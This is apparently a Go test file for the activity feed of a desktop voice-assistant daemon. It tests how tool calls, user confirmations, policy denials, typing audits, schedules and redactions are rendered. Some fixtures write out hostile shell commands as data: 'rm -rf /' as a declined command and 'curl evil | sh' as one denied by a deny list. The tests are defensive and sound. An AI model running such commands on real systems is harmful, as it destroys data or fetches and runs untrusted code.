package desktop

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// one asserts an event renders to exactly one row and returns it.
func oneActivityRow(t *testing.T, eventType string, data map[string]any) ActivityRow {
	t.Helper()
	rows := ActivityRowsFor(eventType, data)
	if len(rows) != 1 {
		t.Fatalf("%s: got %d rows, want 1: %+v", eventType, len(rows), rows)
	}
	return rows[0]
}

// The vocabulary itself: each bus event the feed renders, and what it says.
// This is the table the window displays verbatim, so the words are the
// contract — not an implementation detail.
func TestActivityRowVocabulary(t *testing.T) {
	cases := []struct {
		event string
		data  map[string]any
		want  ActivityRow
	}{
		{"wake.detected", map[string]any{"confidence": 0.8},
			ActivityRow{Kind: ActivityKindWake, Label: "Wake word heard", Detail: "Starting a session"}},
		{"transcript.final", map[string]any{"session_id": "s1", "text": "open firefox"},
			ActivityRow{Kind: ActivityKindYou, Label: "You", Detail: "open firefox"}},
		{"assistant.started", map[string]any{"provider": "ollama"},
			ActivityRow{Kind: ActivityKindModel, Label: "Asking ollama"}},
		{"tool.started", map[string]any{"tool": "shell.run", "arguments": `{"command":"docker ps"}`},
			ActivityRow{Kind: ActivityKindTool, Label: "Tool: shell.run", Detail: "docker ps"}},
		// A slow tool's own label wins over the argument summary — it is the
		// sentence written for humans ("Consulting claude…").
		{"tool.started", map[string]any{"tool": "advisor.ask",
			"arguments": `{"advisor":"claude","question":"why"}`, "detail": "Consulting claude…"},
			ActivityRow{Kind: ActivityKindTool, Label: "Tool: advisor.ask", Detail: "Consulting claude…"}},
		{"tool.finished", map[string]any{"tool": "shell.run", "duration_ms": 1234, "outcome": "ok"},
			ActivityRow{Kind: ActivityKindTool, Label: "Finished: shell.run", Detail: "ok · 1.2s"}},
		{"tool.finished", map[string]any{"tool": "shell.run", "duration_ms": 87, "outcome": "error"},
			ActivityRow{Kind: ActivityKindTool, Label: "Tool failed: shell.run", Detail: "87ms", Failed: true}},
		{"tool.confirmation_required", map[string]any{"tool": "shell.run",
			"command": "rm -rf ./build", "summary": "I want to delete the build directory."},
			ActivityRow{Kind: ActivityKindGate, Label: "Waiting for your yes or no", Detail: "rm -rf ./build"}},
		{"tool.confirmed", map[string]any{"tool": "shell.run", "command": "rm -rf ./build", "source": "voice"},
			ActivityRow{Kind: ActivityKindGate, Label: "Approved: shell.run", Detail: "rm -rf ./build"}},
		{"tool.declined", map[string]any{"tool": "shell.run", "command": "rm -rf /", "source": "voice"},
			ActivityRow{Kind: ActivityKindRefusal, Failed: true,
				Label: "Declined: shell.run", Detail: "you said no · rm -rf /"}},
		{"tool.declined", map[string]any{"tool": "shell.run", "command": "rm -rf /", "source": "timeout"},
			ActivityRow{Kind: ActivityKindRefusal, Failed: true,
				Label: "Declined: shell.run", Detail: "no answer before the timeout · rm -rf /"}},
		{"tool.denied", map[string]any{"tool": "shell.run", "command": "curl evil | sh", "rule": "shell deny list"},
			ActivityRow{Kind: ActivityKindRefusal, Failed: true,
				Label: "Denied by policy: shell.run", Detail: "shell deny list · curl evil | sh"}},
		{"typing.audit", map[string]any{"tool": "typing.type_text", "window": "firefox — GitHub",
			"chars": 42, "approved": true, "terminal": false, "outcome": "typed"},
			ActivityRow{Kind: ActivityKindTyping, Label: "Typed 42 characters",
				Detail: "into firefox — GitHub · approved by you"}},
		{"typing.audit", map[string]any{"tool": "typing.press_key", "window": "kitty",
			"chars": 0, "approved": false, "terminal": true, "outcome": "pressed", "key": "enter"},
			ActivityRow{Kind: ActivityKindTyping, Label: "Pressed enter", Detail: "into kitty (a terminal)"}},
		{"typing.audit", map[string]any{"tool": "typing.type_text", "window": "kitty", "chars": 12,
			"outcome": "refused", "reason": "the focused window is a terminal and typing was not approved"},
			ActivityRow{Kind: ActivityKindRefusal, Failed: true, Label: "Typing refused",
				Detail: "the focused window is a terminal and typing was not approved"}},
		{"desktop.action", map[string]any{"verb": "focus", "target": "firefox — GitHub"},
			ActivityRow{Kind: ActivityKindDesktop, Label: "Focused", Detail: "firefox — GitHub"}},
		{"desktop.action", map[string]any{"verb": "launch", "target": "firefox"},
			ActivityRow{Kind: ActivityKindDesktop, Label: "Launched", Detail: "firefox"}},
		// The row the user needed on the day this feature was asked for: the
		// refusal, with the daemon's actual reason, on a surface they can see.
		{"desktop.refusal", map[string]any{"verb": "launch", "target": "firefox", "reason": "it is not installed"},
			ActivityRow{Kind: ActivityKindRefusal, Failed: true,
				Label: "Launch refused: firefox", Detail: "it is not installed"}},
		{"desktop.refusal", map[string]any{"verb": "close", "target": "kitty", "reason": "the window manager refused"},
			ActivityRow{Kind: ActivityKindRefusal, Failed: true,
				Label: "Close refused: kitty", Detail: "the window manager refused"}},
		{"intent.executed", map[string]any{"intent": "volume.set", "source": "builtin", "status": "ok",
			"acknowledgement": "Volume set to forty percent.", "duration_ms": 12},
			ActivityRow{Kind: ActivityKindIntent, Label: "Intent: volume.set",
				Detail: "Volume set to forty percent. · 12ms"}},
		{"intent.executed", map[string]any{"intent": "custom.lock the screen", "source": "user",
			"status": "failed", "error": "the command was declined"},
			ActivityRow{Kind: ActivityKindIntent, Failed: true,
				Label: "Intent failed: custom.lock the screen", Detail: "the command was declined"}},
		{"routine.started", map[string]any{"routine": "morning", "steps": 3},
			ActivityRow{Kind: ActivityKindRoutine, Label: "Routine: morning", Detail: "3 steps"}},
		{"routine.step", map[string]any{"routine": "morning", "step": 2, "app": "firefox",
			"workspace": 3, "launched": true, "status": "placed"},
			ActivityRow{Kind: ActivityKindRoutine, Label: "Step 2: firefox", Detail: "placed on workspace 3"}},
		{"routine.step", map[string]any{"routine": "morning", "step": 1, "app": "slack",
			"workspace": 2, "launched": false, "status": "placed"},
			ActivityRow{Kind: ActivityKindRoutine, Label: "Step 1: slack",
				Detail: "placed on workspace 2 · already open"}},
		{"routine.step", map[string]any{"routine": "morning", "step": 3, "app": "spotify",
			"workspace": 4, "launched": false, "status": "failed", "detail": "spotify is not installed"},
			ActivityRow{Kind: ActivityKindRoutine, Failed: true,
				Label: "Step 3 failed: spotify", Detail: "spotify is not installed"}},
		{"routine.finished", map[string]any{"routine": "morning", "placed": 2, "failed": 1,
			"summary": "Morning is up; spotify did not start."},
			ActivityRow{Kind: ActivityKindRoutine, Label: "Routine finished: morning",
				Detail: "Morning is up; spotify did not start."}},
		// Scripts (ADR 0030): every run is a row with its exit status and
		// duration — success included, because "did my backup actually run?"
		// must never be answerable only by trusting silence. The path appears
		// on the started row (it is what the gate's confirmation named);
		// output never appears anywhere.
		{"script.started", map[string]any{"script": "backup notes", "path": "/home/u/bin/backup.sh"},
			ActivityRow{Kind: ActivityKindScript, Label: "Script: backup notes",
				Detail: "/home/u/bin/backup.sh"}},
		{"script.finished", map[string]any{"script": "backup notes", "path": "/home/u/bin/backup.sh",
			"status": "ok", "exit_code": 0, "timed_out": false, "duration_ms": 2300},
			ActivityRow{Kind: ActivityKindScript, Label: "Script finished: backup notes",
				Detail: "exit 0 · 2.3s"}},
		{"script.finished", map[string]any{"script": "backup notes", "path": "/home/u/bin/backup.sh",
			"status": "failed", "exit_code": 2, "timed_out": false, "duration_ms": 120},
			ActivityRow{Kind: ActivityKindScript, Failed: true,
				Label: "Script failed: backup notes", Detail: "exit 2 · 120ms"}},
		{"script.finished", map[string]any{"script": "backup notes", "path": "/home/u/bin/backup.sh",
			"status": "failed", "exit_code": -1, "timed_out": true, "duration_ms": 60000},
			ActivityRow{Kind: ActivityKindScript, Failed: true,
				Label: "Script failed: backup notes", Detail: "stopped at the timeout · 60.0s"}},
		{"intent.executed", map[string]any{"intent": "script.run", "source": "script", "status": "ok",
			"script": "backup notes", "acknowledgement": "Backup notes finished.", "duration_ms": 2300},
			ActivityRow{Kind: ActivityKindIntent, Label: "Intent: script.run (script backup notes)",
				Detail: "Backup notes finished. · 2.3s"}},
		// Schedules (ADR 0032): the clock's own rows. Fired precedes the run's
		// ordinary rows; skipped, refused and missed are firings that did not
		// run, each saying why — a schedule must never fail silently.
		{"automation.fired", map[string]any{"kind": "script", "name": "backup notes",
			"schedule": "02:00", "announce": false},
			ActivityRow{Kind: ActivityKindAutomation, Label: "Schedule fired: backup notes",
				Detail: "02:00"}},
		{"automation.skipped", map[string]any{"kind": "script", "name": "backup notes",
			"schedule": "02:00", "reason": "the last run is still going"},
			ActivityRow{Kind: ActivityKindAutomation, Label: "Schedule skipped: backup notes",
				Detail: "the last run is still going"}},
		{"automation.refused", map[string]any{"kind": "script", "name": "backup notes",
			"reason": "it needs your confirmation and a schedule cannot ask",
			"rule":   `tool "script.run" asks unless the configuration names it`},
			ActivityRow{Kind: ActivityKindRefusal, Failed: true,
				Label: "Scheduled run refused: backup notes",
				Detail: "it needs your confirmation and a schedule cannot ask · " +
					`tool "script.run" asks unless the configuration names it`}},
		{"automation.missed", map[string]any{"kind": "script", "name": "backup notes",
			"schedule": "02:00", "due": "2026-08-21T02:00:00+01:00"},
			ActivityRow{Kind: ActivityKindAutomation, Label: "Missed while off: backup notes",
				Detail: "was due 2026-08-21T02:00:00+01:00 · reported, never re-fired"}},
		// Form saves in the window (#99): create, edit, and delete each name
		// the entry, under its kind's own glyph, so a schedule that appears or
		// stops is traceable to the save that did it.
		{"config.entry_changed", map[string]any{"action": "created", "family": "routines",
			"kind": "routine", "name": "morning setup"},
			ActivityRow{Kind: ActivityKindRoutine, Label: "Routine created: morning setup",
				Detail: "config.toml, saved from the window"}},
		{"config.entry_changed", map[string]any{"action": "edited", "family": "scripts",
			"kind": "script", "name": "backup notes"},
			ActivityRow{Kind: ActivityKindScript, Label: "Script edited: backup notes",
				Detail: "config.toml, saved from the window"}},
		{"config.entry_changed", map[string]any{"action": "deleted", "family": "scripts",
			"kind": "script", "name": "backup notes"},
			ActivityRow{Kind: ActivityKindScript, Label: "Script deleted: backup notes",
				Detail: "config.toml, removed from the window"}},
		{"artifact.created", map[string]any{"type": "diagram", "path": "/home/u/Documents/Jarvix/flow.png"},
			ActivityRow{Kind: ActivityKindArtifact, Label: "Artifact created",
				Detail: "diagram · /home/u/Documents/Jarvix/flow.png"}},
		{"memory.injected", map[string]any{"facts": 3, "trimmed": 1, "total": 12, "est_tokens": 120},
			ActivityRow{Kind: ActivityKindMemory, Label: "Remembered facts offered",
				Detail: "3 facts · ~120 tokens · 1 kept out by the token cap"}},
		{"session.timings", map[string]any{"capture_to_transcript_ms": 800,
			"transcript_to_first_delta_ms": 1200, "jarvix_ms": 400, "release_to_first_audio_ms": 2400},
			ActivityRow{Kind: ActivityKindTimings, Label: "Timings",
				Detail: "transcribe 800ms · model 1.2s · jarvix 400ms · to audio 2.4s"}},
		// The excluded spans (#72) take their place in the line — between the
		// model's time and Jarvix's, which is where they fell.
		{"session.timings", map[string]any{"transcript_to_first_delta_ms": 1200,
			"tool_ms": 5300, "confirm_wait_ms": 8000, "jarvix_ms": 400},
			ActivityRow{Kind: ActivityKindTimings, Label: "Timings",
				Detail: "model 1.2s · tools 5.3s · confirming 8.0s · jarvix 400ms"}},
		{"error", map[string]any{"stage": "assistant", "message": "model exploded"},
			ActivityRow{Kind: ActivityKindError, Failed: true,
				Label: "Failed at assistant", Detail: "model exploded"}},
		{"session.cancelled", map[string]any{"reason": "interrupted"},
			ActivityRow{Kind: ActivityKindCancelled, Label: "Cancelled", Detail: "interrupted"}},
	}
	for _, c := range cases {
		if got := oneActivityRow(t, c.event, c.data); got != c.want {
			t.Errorf("%s:\n  got  %+v\n  want %+v", c.event, got, c.want)
		}
	}
}

// The "claimed an action, called no tool" case — the incident that motivated
// the feature — must be a row of its own, not an absence the user has to
// notice. A turn that did call tools gets no marker: its tool rows are the
// evidence.
func TestActivityTextOnlyTurnIsMarked(t *testing.T) {
	rows := ActivityRowsFor("assistant.finished",
		map[string]any{"content": "I have opened Firefox for you.", "tool_calls": 0})
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want the answer plus the text-only marker: %+v", len(rows), rows)
	}
	if rows[0].Kind != ActivityKindAssistant || rows[0].Detail != "I have opened Firefox for you." {
		t.Errorf("answer row = %+v", rows[0])
	}
	marker := rows[1]
	if marker.Kind != ActivityKindTurn {
		t.Errorf("marker kind = %q", marker.Kind)
	}
	if !strings.Contains(marker.Label, "no tools ran") {
		t.Errorf("marker label %q must say no tools ran", marker.Label)
	}

	withTools := ActivityRowsFor("assistant.finished",
		map[string]any{"content": "Done.", "tool_calls": 2})
	if len(withTools) != 1 {
		t.Errorf("a turn with tool calls must not carry the marker: %+v", withTools)
	}
	// An event without the count (an older daemon's shape) claims nothing.
	legacy := ActivityRowsFor("assistant.finished", map[string]any{"content": "Done."})
	if len(legacy) != 1 {
		t.Errorf("without tool_calls the marker must not appear: %+v", legacy)
	}
}

// The privacy redactions, checked by mutation: every event here is salted
// with content the contracts forbid on this surface — dictated text (ADR
// 0023), remembered facts (ADR 0025), desktop context text (ADR 0019),
// search queries (ADR 0028) — and a row that repeats any of it fails. An
// edit that starts copying content into a row cannot pass this test.
func TestActivityRowsNeverLeakPrivateContent(t *testing.T) {
	const secret = "hunter2-the-door-code-is-4312"
	cases := []struct {
		name  string
		event string
		data  map[string]any
	}{
		{"typed text in tool args", "tool.started", map[string]any{
			"tool": "typing.type_text", "arguments": `{"text":"` + secret + `"}`}},
		{"typing audit with a rogue text field", "typing.audit", map[string]any{
			"tool": "typing.type_text", "window": "kitty", "chars": 29,
			"outcome": "typed", "text": secret}},
		{"memory fact in remember args", "tool.started", map[string]any{
			"tool": "memory.remember", "arguments": `{"content":"` + secret + `"}`}},
		{"memory query in recall args", "tool.started", map[string]any{
			"tool": "memory.recall", "arguments": `{"query":"` + secret + `"}`}},
		{"memory query in forget args", "tool.started", map[string]any{
			"tool": "memory.forget", "arguments": `{"query":"` + secret + `"}`}},
		{"memory.injected with rogue content fields", "memory.injected", map[string]any{
			"facts": 1, "trimmed": 0, "total": 1, "est_tokens": 10,
			"content": secret, "fact": secret}},
		{"search query in tool args", "tool.started", map[string]any{
			"tool": "conversations.search", "arguments": `{"query":"` + secret + `"}`}},
		{"artifact source in tool args", "tool.started", map[string]any{
			"tool": "artifact.create", "arguments": `{"format":"document","title":"notes","source":"` + secret + `"}`}},
		{"context capture with rogue text", "context.captured", map[string]any{
			"duration_ms": 90, "sources": []any{map[string]any{
				"source": "clipboard", "chars": 29, "truncated": false,
				"redacted": false, "text": secret}}}},
		{"script events with rogue output fields", "script.finished", map[string]any{
			"script": "backup", "path": "/home/u/bin/backup.sh", "status": "failed",
			"exit_code": 2, "duration_ms": 10, "stdout": secret, "stderr": secret}},
		{"an unknown tool's arguments", "tool.started", map[string]any{
			"tool": "future.tool", "arguments": `{"anything":"` + secret + `"}`}},
	}
	for _, c := range cases {
		for _, row := range ActivityRowsFor(c.event, c.data) {
			joined := row.Kind + " " + row.Label + " " + row.Detail
			if strings.Contains(joined, secret) {
				t.Errorf("%s: the row leaked the content: %+v", c.name, row)
			}
		}
	}
	// And the lengths that stand in for the content are actually there —
	// redaction must not degrade into saying nothing at all.
	row := oneActivityRow(t, "tool.started", map[string]any{
		"tool": "typing.type_text", "arguments": `{"text":"` + secret + `"}`})
	if !strings.Contains(row.Detail, "29 characters") {
		t.Errorf("typed length missing from %q", row.Detail)
	}
}

// The feed's own echo must render to nothing: the daemon's assembler is a
// bus subscriber that also publishes activity.row, and a vocabulary entry
// for it would make the feed feed on itself.
func TestActivityRowsIgnoreTheFeedsOwnEcho(t *testing.T) {
	rows := ActivityRowsFor("activity.row", map[string]any{
		"seq": 1, "kind": "you", "label": "You", "detail": "hello"})
	if len(rows) != 0 {
		t.Fatalf("activity.row rendered %d rows; the feed would consume its own output", len(rows))
	}
	// Noise events stay off the feed too.
	for _, quiet := range []string{"state.changed", "assistant.delta", "tts.started",
		"recording.started", "wake.changed", "config.changed", "tool.progress"} {
		if rows := ActivityRowsFor(quiet, map[string]any{}); len(rows) != 0 {
			t.Errorf("%s should render no rows, got %+v", quiet, rows)
		}
	}
}

// Rows are bounded individually as well as in count: the ring's memory
// ceiling is rows × row caps, and only holds if both are enforced.
func TestActivityRowsAreCapped(t *testing.T) {
	long := strings.Repeat("all work and no play makes jarvix a dull daemon ", 40)
	row := oneActivityRow(t, "transcript.final", map[string]any{"text": long})
	if got := len([]rune(row.Detail)); got > activityDetailLimit+1 { // +1 for the ellipsis
		t.Errorf("detail is %d runes, want at most %d", got, activityDetailLimit+1)
	}
	if !strings.HasSuffix(row.Detail, "…") {
		t.Errorf("a clipped detail should end with an ellipsis: %q", row.Detail)
	}
}

// Accessibility: every kind has its own glyph — rows must be tellable apart
// by shape and words, never colour alone — and an unknown kind still draws
// something.
func TestActivityGlyphsAreDistinct(t *testing.T) {
	seen := map[string]string{}
	for _, kind := range ActivityKinds() {
		glyph := ActivityGlyph(kind)
		if glyph == "" {
			t.Errorf("%s: missing glyph", kind)
		}
		if other, clash := seen[glyph]; clash {
			t.Errorf("%s and %s share a glyph; shape distinguishes rows without colour", kind, other)
		}
		seen[glyph] = kind
	}
	if got := ActivityGlyph("never-heard-of-it"); got != glyphDots {
		t.Errorf("unknown kind: got %q, want the dots glyph", got)
	}
}

// The tooltip picks the most informative detail of the moment, and only for
// session phases — idle, errors, and the wake rows keep their plain text.
func TestLiveTooltip(t *testing.T) {
	thinking := barStates["thinking"]
	awaiting := barStates["awaiting_confirmation"]
	cases := []struct {
		name       string
		state      BarState
		elapsed    int
		tool       string
		toolDetail string
		question   string
		want       string
	}{
		{"static detail before anything happens", thinking, 0, "", "", "",
			"Thinking — Working out an answer"},
		{"elapsed joins the phase", thinking, 12, "", "", "",
			"Thinking — 12s · Working out an answer"},
		{"a running tool beats the static detail", thinking, 12, "shell.run", "", "",
			"Thinking — 12s · running shell.run"},
		{"a slow tool's label beats its name, ellipsis dropped", thinking, 12, "advisor.ask", "Consulting claude…", "",
			"Thinking — 12s · Consulting claude"},
		{"the question is the detail while awaiting", awaiting, 5, "", "", "I want to run docker restart. Should I go ahead?",
			"Waiting for your answer — 5s · I want to run docker restart. Should I go ahead?"},
		{"awaiting without a captured question keeps its detail", awaiting, 5, "", "", "",
			"Waiting for your answer — 5s · A tool call needs confirming"},
		{"a minute reads as minutes", thinking, 90, "", "", "",
			"Thinking — 1m30s · Working out an answer"},
		{"idle never ticks", barStates["idle"], 40, "shell.run", "", "",
			"Jarvix is ready — Click to open the conversation"},
		{"not-running never ticks", barStates[BarKeyNotRunning], 40, "", "", "",
			"Jarvix is not running — " + StartHint},
	}
	for _, c := range cases {
		got := LiveTooltip(c.state, c.elapsed, c.tool, c.toolDetail, c.question)
		if got != c.want {
			t.Errorf("%s:\n  got  %q\n  want %q", c.name, got, c.want)
		}
	}
}

// The checked-in generated library must match the table, for the same reason
// BarState.js must: the plugin runs from a git clone with no Go toolchain,
// so drift is possible and silent. Regenerate with `go generate ./internal/desktop`.
func TestActivityStateJSIsUpToDate(t *testing.T) {
	path := pluginFilePath(t, "ActivityState.js")
	onDisk, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if string(onDisk) != RenderActivityJS() {
		t.Errorf("%s is stale — run: go generate ./internal/desktop", path)
	}
}

// Byte equality proves the file matches the generator; running it under node
// proves the JavaScript answers the way the Go does — for the activity
// glyphs and for the bar's live tooltip, which BarState.js mirrors from
// LiveTooltip. Skips without node, exactly like the BarState mirror test.
func TestActivityAndLiveTooltipJSMirrorGo(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not on PATH; skipping the JavaScript mirror check")
	}

	type tipCase struct {
		State      string `json:"state"`
		Elapsed    int    `json:"elapsed"`
		Tool       string `json:"tool"`
		ToolDetail string `json:"toolDetail"`
		Question   string `json:"question"`
	}
	var tips []tipCase
	for _, key := range BarStateKeys() {
		for _, c := range []tipCase{
			{Elapsed: 0}, {Elapsed: 12}, {Elapsed: 90},
			{Elapsed: 12, Tool: "shell.run"},
			{Elapsed: 12, Tool: "advisor.ask", ToolDetail: "Consulting claude…"},
			{Elapsed: 5, Question: "Should I go ahead?"},
			{Elapsed: 5, Tool: "shell.run", Question: "Should I go ahead?"},
		} {
			c.State = key
			tips = append(tips, c)
		}
	}
	encodedTips, err := json.Marshal(tips)
	if err != nil {
		t.Fatal(err)
	}
	kinds := append(ActivityKinds(), "never-heard-of-it", "")
	encodedKinds, err := json.Marshal(kinds)
	if err != nil {
		t.Fatal(err)
	}

	activityLib, err := os.ReadFile(pluginFilePath(t, "ActivityState.js"))
	if err != nil {
		t.Fatal(err)
	}
	barLib, err := os.ReadFile(barStateJSPath(t))
	if err != nil {
		t.Fatal(err)
	}
	// Both libraries in one script: strip the QML-only pragma from each.
	script := strings.Replace(string(activityLib), ".pragma library", "", 1) +
		strings.Replace(string(barLib), ".pragma library", "", 1) + `
var kinds = ` + string(encodedKinds) + `
var tips = ` + string(encodedTips) + `
console.log(JSON.stringify({
  glyphs: kinds.map(function (k) { return glyphFor(k) }),
  tooltips: tips.map(function (c) {
    return liveTooltip(states[c.state], c.elapsed, c.tool, c.toolDetail, c.question)
  })
}))
`
	file := filepath.Join(t.TempDir(), "mirror.js")
	if err := os.WriteFile(file, []byte(script), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := exec.Command(node, file).Output()
	if err != nil {
		t.Fatalf("running the generated libraries under node failed: %v", err)
	}
	var answers struct {
		Glyphs   []string `json:"glyphs"`
		Tooltips []string `json:"tooltips"`
	}
	if err := json.Unmarshal(out, &answers); err != nil {
		t.Fatalf("decoding the libraries' answers: %v\n%s", err, out)
	}

	for i, kind := range kinds {
		if answers.Glyphs[i] != ActivityGlyph(kind) {
			t.Errorf("glyph for %q: js %q, go %q", kind, answers.Glyphs[i], ActivityGlyph(kind))
		}
	}
	if len(answers.Tooltips) != len(tips) {
		t.Fatalf("got %d tooltip answers for %d cases", len(answers.Tooltips), len(tips))
	}
	for i, c := range tips {
		want := LiveTooltip(barStates[c.State], c.Elapsed, c.Tool, c.ToolDetail, c.Question)
		if answers.Tooltips[i] != want {
			t.Errorf("liveTooltip(%+v):\n  js %q\n  go %q", c, answers.Tooltips[i], want)
		}
	}
}

// formatActivityDuration keeps sub-second figures in milliseconds — a 12ms
// intent reading as "0.0s" would look like a measurement error.
func TestFormatActivityDuration(t *testing.T) {
	for _, c := range []struct {
		ms   int
		want string
	}{{-5, "0ms"}, {0, "0ms"}, {12, "12ms"}, {999, "999ms"}, {1000, "1.0s"}, {2440, "2.4s"}} {
		if got := formatActivityDuration(c.ms); got != c.want {
			t.Errorf("formatActivityDuration(%d) = %q, want %q", c.ms, got, c.want)
		}
	}
}

// Numbers reach the vocabulary as native ints in-process and as float64 after
// a JSON round trip; both must count.
func TestActivityIntToleratesJSONNumbers(t *testing.T) {
	for _, v := range []any{42, int64(42), float64(42)} {
		row := oneActivityRow(t, "typing.audit", map[string]any{
			"outcome": "typed", "window": "kitty", "chars": v})
		if row.Label != "Typed 42 characters" {
			t.Errorf("chars as %T: label = %q", v, row.Label)
		}
	}
}

// Guard against fmt drift in the summary table: a one-character payload must
// not read "1 characters".
func TestActivitySummariesPluraliseCorrectly(t *testing.T) {
	row := oneActivityRow(t, "tool.started", map[string]any{
		"tool": "typing.type_text", "arguments": `{"text":"x"}`})
	if row.Detail != "1 character (text not shown)" {
		t.Errorf("detail = %q", row.Detail)
	}
	if got := oneActivityRow(t, "routine.started",
		map[string]any{"routine": "solo", "steps": 1}).Detail; got != "1 step" {
		t.Errorf("steps detail = %q", got)
	}
}
